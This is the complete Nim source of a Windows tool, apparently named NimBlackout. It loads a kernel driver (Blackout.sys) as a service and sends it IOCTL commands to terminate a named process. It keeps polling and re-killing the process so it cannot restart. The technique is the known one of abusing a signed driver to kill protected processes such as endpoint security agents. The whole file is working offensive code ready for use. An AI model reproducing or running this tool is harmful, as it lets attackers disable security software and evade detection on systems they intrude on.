import winim
import strformat
import strutils
import os
import parseopt


const INITIALIZE_IOCTL_CODE = 0x9876C004
const TERMINATE_PROCESS_IOCTL_CODE = 0x9876C094


# Overload $ proc to allow string conversion of szExeFile
proc `$`(a: array[MAX_PATH, WCHAR]): string = $cast[WideCString](unsafeAddr a[0])



proc GetPID(process_name: string): DWORD =
    var
        pid: DWORD = 0
        entry: PROCESSENTRY32
        hSnapshot: HANDLE
    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)
    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if $entry.szExeFile == process_name:
                pid = entry.th32ProcessID
                break
    return pid



proc LoadDriver(driver_path: cstring): bool=
    var
        hSCM: SC_HANDLE
        hService: SC_HANDLE
        service_name: string = "NimBlackout"

    # Open a handle to the SCM database
    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)
    if hSCM == 0:
        echo "[-] OpenSCManager failed {GetLastError()}"
        return false

    hService = CreateServiceA(
        hSCM,
        service_name,
        service_name,
        SERVICE_START or DELETE or SERVICE_STOP,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        &driver_path,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    )

    if hService == 0:
        if GetLastError() == 1073:
            StartServiceA(hService, 0, NULL)
            echo "[+] Service started"
            return true
        else:
            echo fmt"[-] CreateService failed: {GetLastError()}"
            return false

    StartServiceA(hService, 0, NULL)
    echo "[+] Service started"

    CloseServiceHandle(hService)
    CloseServiceHandle(hSCM)

    return true



proc NimBlackout(process_name: string, driver_path: cstring): void=
    var
        hDevice: HANDLE
        target_pid: DWORD
        bytes_returned: DWORD
        output: DWORD
        outputSize: DWORD = cast[DWORD](sizeof(output))
        result: bool

    if LoadDriver(driver_path):
        echo "[+] Driver loaded successfully !"
    else:
        echo "[-] Failed to load driver, try to run as administrator !"
        return

    hDevice = CreateFileA("\\\\.\\NimBlackout", GENERIC_READ or GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0)
    if hDevice == INVALID_HANDLE_VALUE:
        echo fmt"[-] Failed to open handle to driver, error code: {GetLastError()}"
        return
    echo "[+] Handle to driver open !"


    target_pid = GetPID(process_name)
    if target_pid == 0:
        echo fmt"[-] {process_name} not found !"
        quit(1)
    echo fmt"[+] PID of {process_name}: {target_pid}"

    result = DeviceIoControl(hDevice, cast[DWORD](INITIALIZE_IOCTL_CODE), &target_pid, 64, &output, outputSize, &bytes_returned, NULL)
    if result == false:
        echo "[-] Driver failed to initialize"
        echo "[*] Windows error code: " & $GetLastError()
        quit(1)
    echo "[+] Driver initialized !"

    while true:
        target_pid = GetPID(process_name)
        if target_pid == 0:
            continue

        result = DeviceIoControl(hDevice, cast[DWORD](TERMINATE_PROCESS_IOCTL_CODE), &target_pid, cast[DWORD](sizeof(target_pid)), &output, outputSize, &bytes_returned, NULL)
        if result == false:
            echo "[-] Process failed to terminate"
            echo "[*] Windows error code: " & $GetLastError()
            continue
        echo "[+] Process has been terminated !\n\\_ [*] Keep running if you want avoid restarting"


when isMainModule:
    var args: seq[string] = commandLineParams()
    var par = initOptParser(args)
    var process: seq[string]

    for kind, key, val in args.getopt():
        case kind
        of cmdLongOption, cmdShortOption:
            discard
        of cmdArgument:
            process.add key
        of cmdEnd: assert(false)
    

    var driver_path = getCurrentDir() & r"\Blackout.sys"
    try:
        var process_target = process[0]
        NimBlackout(process_target, driver_path)
    except:
        echo "\n[*] Usage: NimBlackout.exe <process to kill>\n"
